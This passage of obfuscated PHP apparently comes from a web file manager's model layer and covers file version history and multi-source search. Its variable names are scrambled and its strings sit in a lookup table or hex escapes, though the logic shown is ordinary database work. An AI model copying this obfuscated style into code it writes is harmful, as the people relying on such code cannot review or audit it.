isset($“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[1342]])) { $“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[1342]] = $¨·°Ïêõ[$“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[1342]]]; $“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[1343]] = $¨·°Ïêõ[$“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[1343]]]; } if ($“»¤ÂÁ[$„¯©óè¡[33]] == $„¯©óè¡[2424] && isset($“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[191]])) { $“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[191]] = $¨·°Ïêõ[$“»¤ÂÁ[$„¯©óè¡[540]][$„¯©óè¡[191]]]; } $“»¤ÂÁ[$„¯©óè¡[90]] = $¨·°Ïêõ[$“»¤ÂÁ[$„¯©óè¡[191]]]; $“»¤ÂÁ[$„¯©óè¡[2429]] = $¨·°Ïêõ[$“»¤ÂÁ[$„¯©óè¡[2414]]]; if ($“»¤ÂÁ[$„¯©óè¡[33]] == $„¯©óè¡[1330]) { $“»¤ÂÁ[$„¯©óè¡[2429]] = $“»¤ÂÁ[$„¯©óè¡[90]]; $“»¤ÂÁ[$„¯©óè¡[2414]] = $“»¤ÂÁ[$„¯©óè¡[2429]][$„¯©óè¡[191]]; $“»¤ÂÁ[$„¯©óè¡[90]] = !1; $“»¤ÂÁ[$„¯©óè¡[191]] = $„¯©óè¡[12]; } $“»¤ÂÁ[$„¯©óè¡[2353]] = $íª†ŠÎä[$“»¤ÂÁ[$„¯©óè¡[1589]]]; } unset($“»¤ÂÁ); $Òë¾ô”Ô[$„¯©óè¡[446]] = $¬ãÆÉ¢£; return $Òë¾ô”Ô; } public function removeBySource($À¾™ÂÑÔ) { $…¤‹¯êË = array($_SERVER[œ—üé‹ê][506] => $À¾™ÂÑÔ); $this->where($…¤‹¯êË)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\143\x65\x5f\x68\151\x73\164\x6f\x72\x79"; public function historyCount($³œ˜œ«) { $ôÀ¸’Ø =& $_SERVER[œ—üé‹ê]; if (!$³œ˜œ«) { return array(); } if (is_string($³œ˜œ«) || is_int($³œ˜œ«)) { $³œ˜œ« = array($³œ˜œ«); } $¹»åç¨‚ = array($ôÀ¸’Ø[191], $ôÀ¸’Ø[958] => $ôÀ¸’Ø[585]); $‹ñ˜”êö = array($ôÀ¸’Ø[191] => array($ôÀ¸’Ø[7], $³œ˜œ«)); $öÃòá  = $this->field($¹»åç¨‚)->where($‹ñ˜”êö)->group($ôÀ¸’Ø[191])->select(); return array_to_keyvalue($öÃòá , $ôÀ¸’Ø[191], $ôÀ¸’Ø[585]); } public function addHistory($Àíë¦É½, $øØÅÃÂª = '') { $õ°¯åà  =& $_SERVER[œ—üé‹ê]; $£ª½¤ºµ = array($õ°¯åà [506] => $Àíë¦É½[$õ°¯åà [191]], $õ°¯åà [1965] => isset($Àíë¦É½[$õ°¯åà [543]]) ? $Àíë¦É½[$õ°¯åà [543]] : $Àíë¦É½[$õ°¯åà [541]], $õ°¯åà [558] => $Àíë¦É½[$õ°¯åà [557]], $õ°¯åà [640] => $Àíë¦É½[$õ°¯åà [79]], $õ°¯åà [2430] => $øØÅÃÂª); if ($GLOBALS[$õ°¯åà [6]][$õ°¯åà [92]][$õ°¯åà [1403]] >= 1) { $this->historyAutoClear($£ª½¤ºµ[$õ°¯åà [191]]); $this->add($£ª½¤ºµ); } Hook::trigger($õ°¯åà [2431], $£ª½¤ºµ); Model($õ°¯åà [2432])->eventFileEdit($Àíë¦É½[$õ°¯åà [191]]); } private function historyAutoClear($ÚÆƒÜğ) { $ÂœÙ‘ıå =& $_SERVER[œ—üé‹ê]; $Öâ°Š„× = Model($ÂœÙ‘ıå[882])->get($ÂœÙ‘ıå[971]); $Â®Šõ²Á = intval($GLOBALS[$ÂœÙ‘ıå[6]][$ÂœÙ‘ıå[92]][$ÂœÙ‘ıå[1403]]); $à„Û°Ä» = $Öâ°Š„× == $ÂœÙ‘ıå[972] ? min(5, $Â®Šõ²Á) : $Â®Šõ²Á; $à„Û°Ä» = $à„Û°Ä» <= 0 ? 0 : $à„Û°Ä» - 1; if ($à„Û°Ä» >= 499) { return; } $Ä¦¢¯Æ = array($ÂœÙ‘ıå[506] => $ÚÆƒÜğ); $Şü™Œš” = $this->field($ÂœÙ‘ıå[2433])->where($Ä¦¢¯Æ)->order($ÂœÙ‘ıå[2427])->select(); if (!$Şü™Œš” || $à„Û°Ä» >= count($Şü™Œš”)) { return; } $µ«¾¢¥ = array_to_keyvalue($Şü™Œš”, $ÂœÙ‘ıå[12], $ÂœÙ‘ıå[487]); $µ«¾¢¥ = array_slice($µ«¾¢¥, $à„Û°Ä»); $ÒÔË¥‰¾ = array_to_keyvalue($Şü™Œš”, $ÂœÙ‘ıå[12], $ÂœÙ‘ıå[557]); $ÒÔË¥‰¾ = array_slice($ÒÔË¥‰¾, $à„Û°Ä»); if (!$µ«¾¢¥ || !$ÒÔË¥‰¾) { return; } $Ä¦¢¯Æ = array($ÂœÙ‘ıå[508] => array($ÂœÙ‘ıå[7], $µ«¾¢¥)); $this->where($Ä¦¢¯Æ)->delete(); Model($ÂœÙ‘ıå[560])->remove($ÒÔË¥‰¾); } public function listData($ãóçŒº) { $œû‚ı¥¼ =& $_SERVER[œ—üé‹ê]; $ñ°Œ´£– = array($œû‚ı¥¼[506] => $ãóçŒº); $å…ûº”Ä = $œû‚ı¥¼[2434]; $¬£ÄÛü¾ = $this->field($å…ûº”Ä)->where($ñ°Œ´£–)->order($œû‚ı¥¼[2427])->selectPage(); $this->_listAppendUser($¬£ÄÛü¾[$œû‚ı¥¼[446]]); $œæÚ’ = Model($œû‚ı¥¼[882])->get($œû‚ı¥¼[971]); $Îñ‰¤” = 5; if ($œæÚ’ == $œû‚ı¥¼[972]) { $¬£ÄÛü¾[$œû‚ı¥¼[446]] = array_slice($¬£ÄÛü¾[$œû‚ı¥¼[446]], 0, $Îñ‰¤”); $¬£ÄÛü¾[$œû‚ı¥¼[443]] = array($œû‚ı¥¼[2435] => 1, $œû‚ı¥¼[2436] => 20, $œû‚ı¥¼[2437] => 1, $œû‚ı¥¼[2327] => count($¬£ÄÛü¾[$œû‚ı¥¼[446]])); } return $¬£ÄÛü¾; } protected function _listAppendUser(&$ß×Âæ) { $˜Î†´úƒ =& $_SERVER[œ—üé‹ê]; $üÄøµÏ× = array_to_keyvalue($ß×Âæ, $˜Î†´úƒ[12], $˜Î†´úƒ[1589]); $Ì”Í‘ÃÃ = Model($˜Î†´úƒ[617])->userListInfo($üÄøµÏ×); foreach ($ß×Âæ as &$òºõµ›Å) { $øöÎ¤È = $òºõµ›Å[$˜Î†´úƒ[1589]]; $òºõµ›Å[$˜Î†´úƒ[541]] = $Ì”Í‘ÃÃ[$øöÎ¤È] ? $Ì”Í‘ÃÃ[$øöÎ¤È] : !1; } unset($òºõµ›Å); } public function fileInfo($ÁÎ”¦’—, $±˜Øíª´ = false) { $µ‚‚›¾œ =& $_SERVER[œ—üé‹ê]; $şÆ¯ğŠ˜ = $this->tablePrefix; $«î´è³Ø = "{$şÆ¯ğŠ˜}\151\x6f\137\x66\151\x6c\x65\40\x66\x69\x6c\145\163\x20\157\x6e\x20\146\151\154\x65\x73\56\x66\x69\x6c\145\x49\104\x20\75\x20\150\x69\163\x74\x6f\162\171\56\x66\151\x6c\145\111\x44"; $ˆğìáÚĞ = $this->alias($µ‚‚›¾œ[2438])->where(array($µ‚‚›¾œ[508] => $ÁÎ”¦’—))->join($«î´è³Ø, $µ‚‚›¾œ[2439])->find(); if ($ˆğìáÚĞ && $±˜Øíª´) { $ƒº§š”È = array($µ‚‚›¾œ[191] => $ˆğìáÚĞ[$µ‚‚›¾œ[191]], $µ‚‚›¾œ[487] => array($µ‚‚›¾œ[1180], $ÁÎ”¦’—)); $ˆğìáÚĞ[$µ‚‚›¾œ[1860]] = $this->where($ƒº§š”È)->count(); } return $ˆğìáÚĞ; } public function removeItem($Ä«¼±ƒ¢) { $ÅÌñÙ–ƒ =& $_SERVER[œ—üé‹ê]; $‡ËºÚŠ = array($ÅÌñÙ–ƒ[508] => $Ä«¼±ƒ¢); $åšÒ„‰ù = $this->where($‡ËºÚŠ)->find(); if ($åšÒ„‰ù) { $Ëõ ‚ıÏ = $this->where($‡ËºÚŠ)->delete(); Model($ÅÌñÙ–ƒ[560])->remove($åšÒ„‰ù[$ÅÌñÙ–ƒ[557]]); return $Ëõ ‚ıÏ; } return !1; } public function removeBySource($øä»¹ûÒ) { $“Õôõ¬« =& $_SERVER[œ—üé‹ê]; if (!$øä»¹ûÒ) { return !1; } if (!is_array($øä»¹ûÒ)) { $øä»¹ûÒ = array($øä»¹ûÒ); } $÷º›«â¯ = array($“Õôõ¬«[506] => array($“Õôõ¬«[7], $øä»¹ûÒ)); $©¨·„¿® = $this->field($“Õôõ¬«[558])->where($÷º›«â¯)->select(); if ($©¨·„¿®) { $this->where($÷º›«â¯)->delete(); $®Ñïˆ  = array_to_keyvalue($©¨·„¿®, $“Õôõ¬«[12], $“Õôõ¬«[557]); Model($“Õôõ¬«[560])->remove($®Ñïˆ ); } return !0; } public function setDetail($èĞœœı, $•úìëŒÅ) { $¾üŞÖÜú =& $_SERVER[œ—üé‹ê]; return $this->where(array($¾üŞÖÜú[508] => $èĞœœı))->save(array($¾üŞÖÜú[2430] => $•úìëŒÅ)); } public function rollbackToItem($¿Ä•üªÑ, $µú·Í€ö) { $üÌ–áİ =& $_SERVER[œ—üé‹ê]; $öÑåÉ“ = Model($üÌ–áİ[942])->sourceInfo($¿Ä•üªÑ); $this->addHistory($öÑåÉ“, LNG($üÌ–áİ[2440])); $÷‚ú¨ı› = $this->find($µú·Í€ö); $°Øü»ŠĞ = array($üÌ–áİ[557] => $÷‚ú¨ı›[$üÌ–áİ[557]], $üÌ–áİ[79] => $÷‚ú¨ı›[$üÌ–áİ[79]], $üÌ–áİ[88] => time(), $üÌ–áİ[543] => USER_ID); Model($üÌ–áİ[942])->where(array($üÌ–áİ[191] => $¿Ä•üªÑ))->save($°Øü»ŠĞ); return $this->where(array($üÌ–áİ[508] => $µú·Í€ö))->delete(); } public function clearSame($ÃÅ°‡Ò) { $öÑÄ¦ì– =& $_SERVER[œ—üé‹ê]; $ç¤ Ù¢Û = $this->listData($ÃÅ°‡Ò); $´Û«´¾ = array_to_keyvalue_group($ç¤ Ù¢Û, $öÑÄ¦ì–[557]); $ËœÈı¸ = array(); $Ã½Ğá¤‘ = array(); foreach ($´Û«´¾ as $„Àå¤øø) { if (!$„Àå¤øø || count($„Àå¤øø) <= 1) { continue; } foreach ($„Àå¤øø as $²õ¡ª¤) { $ËœÈı¸[] = $²õ¡ª¤[$öÑÄ¦ì–[557]]; $Ã½Ğá¤‘[] = $²õ¡ª¤[$öÑÄ¦ì–[487]]; } } if (!$Ã½Ğá¤‘) { return; } $this->where(array($öÑÄ¦ì–[487] => array($öÑÄ¦ì–[7], $Ã½Ğá¤‘)))->delete(); Model($öÑÄ¦ì–[560])->remove($ËœÈı¸); } public function userSpace() { $üÛ†„‡ =& $_SERVER[œ—üé‹ê]; $¦âÂñ§Æ = $this->tablePrefix; $™êÍşš… = array($üÛ†„‡[1965] => USER_ID); $¦ï³µ¯ = "{$¦âÂñ§Æ}\x69\157\x5f\146\151\x6c\x65\40\146\151\154\145\163\x20\157\156\40\146\x69\154\145\163\x2e\146\x69\154\x65\x49\x44\40\x3d\x20\x68\x69\x73\164\x6f\x72\x79\56\146\x69\x6c\145\111\104"; return $this->alias($üÛ†„‡[2438])->where($™êÍşš…)->join($¦ï³µ¯, $üÛ†„‡[2439])->sum($üÛ†„‡[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¿ò¬ÅÛ”) { $Éõ¥ê¯ =& $_SERVER[œ—üé‹ê]; $šŸˆ¾ºê = KodIO::fileTypeList(); $ª¾’˜ëĞ = $šŸˆ¾ºê[$¿ò¬ÅÛ”]; if (!$ª¾’˜ëĞ) { return array(); } $ç°ÌÚÓ‚ = $ª¾’˜ëĞ[$Éõ¥ê¯[166]]; $òªñ†ô = $Éõ¥ê¯[7]; if (!$ª¾’˜ëĞ[$Éõ¥ê¯[166]]) { $„ƒ·•™ô = array_to_keyvalue($šŸˆ¾ºê, $Éõ¥ê¯[12], $Éõ¥ê¯[166]); $ç°ÌÚÓ‚ = implode($Éõ¥ê¯[50], $„ƒ·•™ô); $òªñ†ô = $Éõ¥ê¯[2441]; } $ñ˜¦Ö‘ = explode($Éõ¥ê¯[50], trim($ç°ÌÚÓ‚, $Éõ¥ê¯[50])); return array($òªñ†ô, $ñ˜¦Ö‘); } public function listPathType($ÑĞ°Ã”È) { $ºö— ¾ğ =& $_SERVER[œ—üé‹ê]; $ö€à°ıï = $this->fileTypeWhere($ÑĞ°Ã”È); if (!$ö€à°ıï) { return array(); } $ÒŞ†‡ÔÏ = USER_ID; $‹¨ìŠ›‘ = Model($ºö— ¾ğ[617])->getInfo($ÒŞ†‡ÔÏ); $¬î³¿Îû = array($ºö— ¾ğ[670] => SourceModel::TYPE_USER, $ºö— ¾ğ[604] => array($ºö— ¾ğ[635], $ºö— ¾ğ[613] . $‹¨ìŠ›‘[$ºö— ¾ğ[90]][$ºö— ¾ğ[191]] . $ºö— ¾ğ[636]), $ºö— ¾ğ[671] => $ÒŞ†‡ÔÏ, $ºö— ¾ğ[668] => 0, $ºö— ¾ğ[669] => $ö€à°ıï); return $this->listSource($¬î³¿Îû); } public function listSearch($½¹ßÄ¦, $»”³­Ëå = 300) { $ªÍáğ‰ =& $_SERVER[œ—üé‹ê]; if (isset($½¹ßÄ¦[$ªÍáğ‰[2276]]) && $½¹ßÄ¦[$ªÍáğ‰[2276]]) { $½¹ßÄ¦[$ªÍáğ‰[2276]] = str_replace($ªÍáğ‰[474], $ªÍáğ‰[2442], trim($½¹ßÄ¦[$ªÍáğ‰[2276]])); } $ƒÔô×Š‘ = $this->_parseSearchWhere($½¹ßÄ¦); if (!isset($ƒÔô×Š‘[$ªÍáğ‰[520]])) { $ƒÔô×Š‘[$ªÍáğ‰[520]] = 0; } $ĞÄî€Š– = $ªÍáğ‰[2443]; $å“¹‚Ó = $ƒÔô×Š‘; $×¬ïŞ‚Õ = $ĞÄî€Š–; $this->_listSearchBindPinyin($½¹ßÄ¦, $ƒÔô×Š‘, $ĞÄî€Š–); $this->alias($ªÍáğ‰[533])->_makeOrder(); $ƒÔô×Š‘ = $this->parseWhereLike($ƒÔô×Š‘); $¾ó¤¯… = $this->distinct(!0)->field($ĞÄî€Š–)->where($ƒÔô×Š‘)->selectPage($»”³­Ëå); if ($GLOBALS[$ªÍáğ‰[6]][$ªÍáğ‰[468]][$ªÍáğ‰[469]] && Input::check($½¹ßÄ¦[$ªÍáğ‰[2276]], $ªÍáğ‰[677]) && $¾ó¤¯…[$ªÍáğ‰[443]][$ªÍáğ‰[428]] == 1 && $¾ó¤¯…[$ªÍáğ‰[443]][$ªÍáğ‰[444]] == 0) { $¾ó¤¯… = $this->distinct(!0)->field($ĞÄî€Š–)->where($å“¹‚Ó)->limit(1000)->select(); $¾ó¤¯… = array_page_split($¾ó¤¯…, !1, $»”³­Ëå); } $this->_listSearchFileContent($¾ó¤¯…, $½¹ßÄ¦, $×¬ïŞ‚Õ, $å“¹‚Ó); $this->_listSearchDesc($¾ó¤¯…, $½¹ßÄ¦, $×¬ïŞ‚Õ); $this->_listSearchTag($¾ó¤¯…, $½¹ßÄ¦, $×¬ïŞ‚Õ); $this->_listSearchGroupTag($¾ó¤¯…, $½¹ßÄ¦, $×¬ïŞ‚Õ); $this->_listDataApply($¾ó¤¯…[$ªÍáğ‰[446]]); $this->_listMake($¾ó¤¯…); return $¾ó¤¯…; } private function _listSearchFileContent(&$Ó™Æú«, $•‹‚šŞ, $ÆûĞš‚Á, $‹Æ¹×Š) { $Ìáàä–â =& $_SERVER[œ—üé‹ê]; if (!$•‹‚šŞ[$Ìáàä–â[2276]] || $Ó™Æú«[$Ìáàä–â[443]][$Ìáàä–â[428]] > 1) { return; } if (!isset($‹Æ¹×Š[$Ìáàä–â[32]]) || !is_array($•‹‚šŞ[$Ìáàä–â[557]]) || !$•‹‚šŞ[$Ìáàä–â[557]]) { return; } $‹Æ¹×Š[$Ìáàä–â[557]] = array($Ìáàä–â[7], $•‹‚šŞ[$Ìáàä–â[557]]); unset($‹Æ¹×Š[$Ìáàä–â[32]]); unset($•‹‚šŞ[$Ìáàä–â[557]]); $ã‰ãïÜ› = $this->field($ÆûĞš‚Á)->where($‹Æ¹×Š)->limit($Ìáàä–â[2444])->select(); $ã‰ãïÜ› = array_to_keyvalue($ã‰ãïÜ›, $Ìáàä–â[191], $Ìáàä–â[12]); $ÇüÛ¸Ô´ = array_to_keyvalue($Ó™Æú«[$Ìáàä–â[446]], $Ìáàä–â[191], $Ìáàä–â[12]); $·³â”Æ = array(); foreach ($ã‰ãïÜ› as $¨Â’µ‡ => $ÆƒÕ•á®) { if (!$ÇüÛ¸Ô´[$¨Â’µ‡]) { $·³â”Æ[] = $ÆƒÕ•á®; } } if (!$·³â”Æ) { return; } $Ó™Æú«[$Ìáàä–â[446]] = array_merge($·³â”Æ, $Ó™Æú«[$Ìáàä–â[446]]); $Ó™Æú«[$Ìáàä–â[443]][$Ìáàä–â[444]] += count($·³â”Æ); } private function _listSearchTag(&$ÊĞé³×, $‡„À·Ò, $œ°†…øÜ) { $ù›ş¤ïÙ =& $_SERVER[œ—üé‹ê]; if (empty($‡„À·Ò[$ù›ş¤ïÙ[2140]]) || !in_array($ù›ş¤ïÙ[2445], $‡„À·Ò[$ù›ş¤ïÙ[2140]])) { return; } if (!$‡„À·Ò[$ù›ş¤ïÙ[2276]] || $ÊĞé³×[$ù›ş¤ïÙ[443]][$ù›ş¤ïÙ[428]] > 1) { return; } $Ğ…ı®„™ = Model($ù›ş¤ïÙ[2446])->listData(); $¥©ß ­Û = array(); $„Ëø°Œ = $‡„À·Ò[$ù›ş¤ïÙ[2276]]; foreach ($Ğ…ı®„™ as $¯åŠØò‹) { $ÄÔ§£â· = $¯åŠØò‹[$ù›ş¤ïÙ[32]]; $ş•ÂĞ¸å = str_replace($ù›ş¤ïÙ[53], $ù›ş¤ïÙ[12], Pinyin::get($ÄÔ§£â·)); if (stripos($ÄÔ§£â·, $„Ëø°Œ) !== !1 || stripos($ş•ÂĞ¸å, $„Ëø°Œ) !== !1) { $¥©ß ­Û[] = $¯åŠØò‹[$ù›ş¤ïÙ[487]]; } } if (!$¥©ß ­Û) { return; } $àÎƒ‚œÅ = array($ù›ş¤ïÙ[515] => array($ù›ş¤ïÙ[7], $¥©ß ­Û), $ù›ş¤ïÙ[1589] => USER_ID); $ûşÙ•¿Ñ = Model($ù›ş¤ïÙ[517])->field($ù›ş¤ïÙ[87])->where($àÎƒ‚œÅ)->select(); $ûşÙ•¿Ñ = array_to_keyvalue($ûşÙ•¿Ñ, $ù›ş¤ïÙ[12], $ù›ş¤ïÙ[87]); $ ËÀÙºş = array_unique($ûşÙ•¿Ñ); $this->_listSearchMerge($ÊĞé³×, $‡„À·Ò, $œ°†…øÜ, $ ËÀÙºş); } private function _listSearchDesc(&$øÎÍĞ ¢, $ú±‘¹·Ê, $ÈÇÎä÷Â) { $ò”™îüƒ =& $_SERVER[œ—üé‹ê]; if (empty($ú±‘¹·Ê[$ò”™îüƒ[2140]]) || !in_array($ò”™îüƒ[540], $ú±‘¹·Ê[$ò”™îüƒ[2140]])) { return; } if (!$ú±‘¹·Ê[$ò”™îüƒ[2276]] || $øÎÍĞ ¢[$ò”™îüƒ[443]][$ò”™îüƒ[428]] > 1) { return; } $ŞÖ¯ª Å = array($ò”™îüƒ[95] => $ò”™îüƒ[540], $ò”™îüƒ[451] => array($ò”™îüƒ[473], $ò”™îüƒ[2278] . $ú±‘¹·Ê[$ò”™îüƒ[2276]] . $ò”™îüƒ[2278])); $™Â³°÷§ = !1; if ($™Â³°÷§) { $ÏèóÔ¨ñ = $this->listSearchChildren($ú±‘¹·Ê[$ò”™îüƒ[190]]); $ÏèóÔ¨ñ = array_unique($ÏèóÔ¨ñ); if (!$ÏèóÔ¨ñ) { return; } $ŞÖ¯ª Å[$ò”™îüƒ[191]] = array($ò”™îüƒ[7], $ÏèóÔ¨ñ); } $Àº²›½½ = Model($ò”™îüƒ[471])->field($ò”™îüƒ[191])->where($ŞÖ¯ª Å)->limit(5000)->select(); $•ÀÅíè† = array_to_keyvalue($Àº²›½½, $ò”™îüƒ[12], $ò”™îüƒ[191]); $this->_listSearchMerge($øÎÍĞ ¢, $ú±‘¹·Ê, $ÈÇÎä÷Â, $•ÀÅíè†); } private function _listSearchGroupTag(&$¨›Â‘å“, $—ÒÍîúÖ, $¶¶ ÀßÂ) { $˜ËêÀƒÓ =& $_SERVER[œ—üé‹ê]; if (empty($—ÒÍîúÖ[$˜ËêÀƒÓ[2140]]) || !in_array($˜ËêÀƒÓ[2445], $—ÒÍîúÖ[$˜ËêÀƒÓ[2140]])) { return; } if (!$—ÒÍîúÖ[$˜ËêÀƒÓ[2276]] || $¨›Â‘å“[$˜ËêÀƒÓ[443]][$˜ËêÀƒÓ[428]] > 1 || !$—ÒÍîúÖ[$˜ËêÀƒÓ[190]]) { return; } $ñŞş¥§œ = $this->sourceInfo($—ÒÍîúÖ[$˜ËêÀƒÓ[190]]); if (!$ñŞş¥§œ || $ñŞş¥§œ[$˜ËêÀƒÓ[188]] != SourceModel::TYPE_GROUP) { return; } $®–¯ğÈÌ = $ñŞş¥§œ[$˜ËêÀƒÓ[589]]; $Ù©ÅÎ’› = Model($˜ËêÀƒÓ[2447])->get($®–¯ğÈÌ); $¥¯©Ëø‹ = array(); $òåŒ™ŠÚ = $—ÒÍîúÖ[$˜ËêÀƒÓ[2276]]; foreach ($Ù©ÅÎ’›[$˜ËêÀƒÓ[446]] as $ÛÌ°›òô) { $Ù‡Ææ¯ú = $ÛÌ°›òô[$˜ËêÀƒÓ[32]]; $µ‰ù•¢á = str_replace($˜ËêÀƒÓ[53], $˜ËêÀƒÓ[12], Pinyin::get($Ù‡Ææ¯ú)); if (stripos($Ù‡Ææ¯ú, $òåŒ™ŠÚ) !== !1 || stripos($µ‰ù•¢á, $òåŒ™ŠÚ) !== !1) { $¥¯©Ëø‹[] = $ÛÌ°›òô[$˜ËêÀƒÓ[487]]; } } if (!$¥¯©Ëø‹) { return; } $ÓØ«ü¢ = array($˜ËêÀƒÓ[515] => array($˜ËêÀƒÓ[7], $¥¯©Ëø‹), $˜ËêÀƒÓ[1589] => 0, $˜ËêÀƒÓ[33] => $˜ËêÀƒÓ[1487] . $®–¯ğÈÌ); $š½Ö½ŒØ = Model($˜ËêÀƒÓ[517])->field($˜ËêÀƒÓ[87])->where($ÓØ«ü¢)->select(); $š½Ö½ŒØ = array_to_keyvalue($š½Ö½ŒØ, $˜ËêÀƒÓ[12], $˜ËêÀƒÓ[87]); $ÀÎóÈËğ = array_unique($š½Ö½ŒØ); $this->_listSearchMerge($¨›Â‘å“, $—ÒÍîúÖ, $¶¶ ÀßÂ, $ÀÎóÈËğ); } private function _listSearchMerge(&$»—úşÎ, $º¾Õ˜­¾, $–şÁÑç, $»ÆŒ šö) { $ãË¶›ş =& $_SERVER[œ—üé‹ê]; if (!$»ÆŒ šö) { return; } $¥Ü”»¯Ü = array_to_keyvalue($»—úşÎ[$ãË¶›ş[446]], $ãË¶›ş[12], $ãË¶›ş[191]); $ûØî²İ¤ = array_diff($»ÆŒ šö, $¥Ü”»¯Ü); if (!$ûØî²İ¤) { return; } $âØ¼Ô© = array($ãË¶›ş[191] => array($ãË¶›ş[7], $ûØî²İ¤)); $“ ¡¡Ú = $this->field($–şÁÑç)->where($âØ¼Ô©)->select(); if (!$“ ¡¡Ú) { return; } $¸…¦ª×‘ = array(); foreach ($“ ¡¡Ú as $«Ö©ÂÎõ) { if ($this->_listSearchFilter($«Ö©ÂÎõ, $º¾Õ˜­¾)) { $¸…¦ª×‘[] = $«Ö©ÂÎõ; } } $»—úşÎ[$ãË¶›ş[446]] = array_merge($¸…¦ª×‘, $»—úşÎ[$ãË¶›ş[446]]); $»—úşÎ[$ãË¶›ş[443]][$ãË¶›ş[444]] += count($¸…¦ª×‘); } private function _listSearchFilter($£ ™ö×ä, $©¢Ğ„ìÅ) { $œ°ï¯Íè =& $_SERVER[œ—üé‹ê]; $ˆ÷÷Ø«ô = $£ ™ö×ä[$œ°ï¯Íè[500]] == $œ°ï¯Íè[91]; if (!strstr($£ ™ö×ä[$œ°ï¯Íè[604]], $œ°ï¯Íè[50] . $©¢Ğ„ìÅ[$œ°ï¯Íè[190]] . $œ°ï¯Íè[50])) { return !1; } if (isset($©¢Ğ„ìÅ[$œ°ï¯Íè[501]]) && $©¢Ğ„ìÅ[$œ°ï¯Íè[501]] != $œ°ï¯Íè[953]) { if ($©¢Ğ„ìÅ[$œ°ï¯Íè[501]] == $œ°ï¯Íè[78] && !$ˆ÷÷Ø«ô) { return !1; } if ($©¢Ğ„ìÅ[$œ°ï¯Íè[501]] != $œ°ï¯Íè[78] && $ˆ÷÷Ø«ô) { return !1; } if (!strstr($£ ™ö×ä[$œ°ï¯Íè[166]], $œ°ï¯Íè[50] . $©¢Ğ„ìÅ[$œ°ï¯Íè[501]] . $œ°ï¯Íè[50])) { return !1; } } if (isset($©¢Ğ„ìÅ[$œ°ï¯Íè[2448]]) && $©¢Ğ„ìÅ[$œ°ï¯Íè[2448]] < $£ ™ö×ä[$œ°ï¯Íè[79]]) { return !1; } if (isset($©¢Ğ„ìÅ[$œ°ï¯Íè[2449]]) && $©¢Ğ„ìÅ[$œ°ï¯Íè[2449]] > $£ ™ö×ä[$œ°ï¯Íè[79]]) { return !1; } if (isset($©¢Ğ„ìÅ[$œ°ï¯Íè[684]]) && $©¢Ğ„ìÅ[$œ°ï¯Íè[684]] != $£ ™ö×ä[$œ°ï¯Íè[543]]) { return !1; } return !0; } public function listSearchChildren($¶›íİ¤‚, $µÕ¯Ş« = 5000) { $ş€âŠö =& $_SERVER[œ—üé‹ê]; $Ì½¨é”ö = array(); $…øˆìÎñ = $this->sourceInfo($¶›íİ¤‚); $ó®áÄÜ = array($ş€âŠö[604] => array($ş€âŠö[473], $…øˆìÎñ[$ş€âŠö[604]] . $…øˆìÎñ[$ş€âŠö[191]] . $ş€âŠö[636])); $ú«¿à˜ª = $this->field($ş€âŠö[79])->where($ó®áÄÜ)->limit($µÕ¯Ş« + 1)->select(); $ªÀ—ò×ƒ = is_array($ú«¿à˜ª) ? count($ú«¿à˜ª) : 0; if ($ªÀ—ò×ƒ > $µÕ¯Ş«) { return $this->_listSearchChildrenNear($¶›íİ¤‚, $µÕ¯Ş«); } $ò¬Ö¿—è = $this->field($ş€âŠö[191])->where($ó®áÄÜ)->select(); $Ì½¨é”ö = array_to_keyvalue($ò¬Ö¿—è, $ş€âŠö[12], $ş€âŠö[191]); return $Ì½¨é”ö; } private function _listSearchChildrenNear($ùí±÷Á, $Å«Ô§ÉÓ) { $–°½üÒá =& $_SERVER[œ—üé‹ê]; $ù“Æ±àÙ = array(); $úÃıÃë¯ = array($–°½üÒá[190] => $ùí±÷Á); $’…ÇÖˆÁ = $this->field($–°½üÒá[2450])->where($úÃıÃë¯)->select(); $”ë©½ü« = array_to_keyvalue(array_filter_by_field($’…ÇÖˆÁ, $–°½üÒá[500], $–°½üÒá[91]), $–°½üÒá[12], $–°½üÒá[191]); $ù“Æ±àÙ = array_merge($ù“Æ±àÙ, array_to_keyvalue($’…ÇÖˆÁ, $–°½üÒá[12], $–°½üÒá[191])); if (!$”ë©½ü«) { return $ù“Æ±àÙ; } $úÃıÃë¯ = array($–°½üÒá[190] => array($–°½üÒá[7], $”ë©½ü«)); $’…ÇÖˆÁ = $this->field($–°½üÒá[2450])->where($úÃıÃë¯)->limit($Å«Ô§ÉÓ)->select(); $ù“Æ±àÙ = array_merge($ù“Æ±àÙ, array_to_keyvalue($’…ÇÖˆÁ, $–°½üÒá[12], $–°½üÒá[191])); $ù“Æ±àÙ = array_slice($ù“Æ±àÙ, 0, intval($Å«Ô§ÉÓ)); return $ù“Æ±àÙ; } private function _listSearchBindPinyin($¶İ¶„á¨, &$Ï“µÙ™“, &$¡³•ş¢Ø) { $”èÆØÃü =& $_SERVER[œ—üé‹ê]; if (!isset($¶İ¶„á¨[$”èÆØÃü[2276]]) || !$¶İ¶„á¨[$”èÆØÃü[2276]]) { return; } if (!Input::check($¶İ¶„á¨[$”èÆØÃü[2276]], $”èÆØÃü[393]) || strlen($¶İ¶„á¨[$”èÆØÃü[2276]]) < 2) { return; } $Ïµ¹ÖÁ¥ = "\x4c\105\106\124\40\112\117\111\116\x20{$this->tablePrefix}\151\x6f\x5f\x73\157\x75\162\x63\145\x5f\x6d\145\164\x61\x20\155\x65\164\141\x20\157\x6e\40\163\x6f\x75\162\x63\145\x2e\x73\157\x75\x72\143\x65\111\x44\40\75\40\x6d\145\164\141\56\x73\x6f\x75\x72\x63\145\111\104"; $––›ãŞÊ = array(); $¡³•ş¢Ø = str_replace(array($”èÆØÃü[285], $”èÆØÃü[53], $”èÆØÃü[2451]), $”èÆØÃü[12], $¡³•ş¢Ø); $¡³•ş¢Ø = $”èÆØÃü[525] . str_replace($”èÆØÃü[50], $”èÆØÃü[526], $¡³•ş¢Ø); $ŒşıñŠ = $Ï“µÙ™“[$”èÆØÃü[32]]; unset($Ï“µÙ™“[$”èÆØÃü[32]]); foreach ($Ï“µÙ™“ as $Ûøù±®— => 